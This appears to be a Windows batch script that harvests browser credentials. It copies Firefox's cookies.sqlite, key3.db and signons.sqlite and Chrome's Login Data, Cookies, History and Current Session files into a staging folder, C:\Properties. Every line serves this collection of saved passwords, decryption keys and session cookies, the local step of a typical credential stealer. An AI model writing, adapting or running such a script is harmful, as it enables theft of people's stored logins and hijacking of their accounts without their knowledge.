md C:\Properties
md C:\Properties\Mozilla
cd %AppData%\Mozilla\Firefox\Profiles\*.default
copy /y cookies.sqlite C:\Properties\Mozilla
copy /y key3.db C:\Properties\Mozilla
copy /y signons.sqlite C:\Properties\Mozilla
copy /y %AppData%\Mozilla\Firefox\Profiles\*.default C:\Properties\Mozilla

md C:\Properties\Chrome
cd %UserProfile%\AppData\local\Google\Chrome\User Data\Default\
copy /y "Login Data" C:\Properties\Chrome
copy /y "Login Data-journal" C:\Properties\Chrome
copy /y "History" C:\Properties\Chrome
copy /y "History-journal" C:\Properties\Chrome
copy /y "Cookies" C:\Properties\Chrome
copy /y "Cookies-journal" C:\Properties\Chrome
copy /y "Current Session" C:\Properties\Chrome
